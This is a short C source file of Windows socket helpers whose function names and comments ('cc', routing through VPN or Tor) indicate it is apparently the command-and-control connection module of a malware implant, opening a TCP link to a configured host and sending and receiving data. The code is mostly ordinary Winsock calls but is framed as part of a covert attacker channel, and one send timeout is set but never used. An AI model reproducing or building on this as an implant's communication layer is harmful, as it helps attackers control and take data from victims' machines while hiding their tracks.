#include <WinSock2.h>
#include <MSWSock.h>
#include <Windows.h>
#include "config.h"


SOCKET __socket_cc_open() {
	WSADATA wsa = {0};
	SOCKET sock = 0xFFFFFFFF;
	SOCKADDR_IN addr_out = {0};
	struct hostent *shost;
	int timeout_recv = 0;
	int timeout_send = 1500; // VPN r00lz
					// 6000; // onion to tor to onion to....  :)

	WSAStartup(MAKEWORD(2,2),&wsa);


	if(!(shost = gethostbyname(HOST)))
		return 0;
	

	addr_out.sin_addr =  *((struct in_addr *)shost->h_addr);
	addr_out.sin_family = AF_INET;
	addr_out.sin_port = htons(PORT);
	ZeroMemory(addr_out.sin_zero,8);


	if((sock=WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0))==(~0)) {
		return 0;
	}

	if(WSAConnect(sock, (SOCKADDR *)&addr_out, sizeof(addr_out), 0 , 0, 0, 0)==SOCKET_ERROR) {
			if(sock)
				closesocket(sock);

			return 0;
	}

	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout_recv, sizeof(int));
	setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout_recv, sizeof(int));
	

	return sock;
}



int __socket_cc_close(SOCKET sock) {

	if(sock)
		closesocket(sock);

	sock = 0;
	WSACleanup();
	return 0;
}



unsigned long __socket_cc_send(SOCKET sock, char *buff) {
	unsigned long sended = 0x0000000;
	int len = lstrlenA(buff);

	if(lstrlenA(buff)<=1) {
		return 0;
	}


		if((sended = send(sock,buff,len,0))==SOCKET_ERROR) {
			return -1;
	}

	return sended;
}

unsigned long __socket_cc_recv(SOCKET sock, char *buff, int len) {
	int received;
	

	if((received = recv(sock,buff,len,0))==0) {
			return -1;
	}

	return received;
}
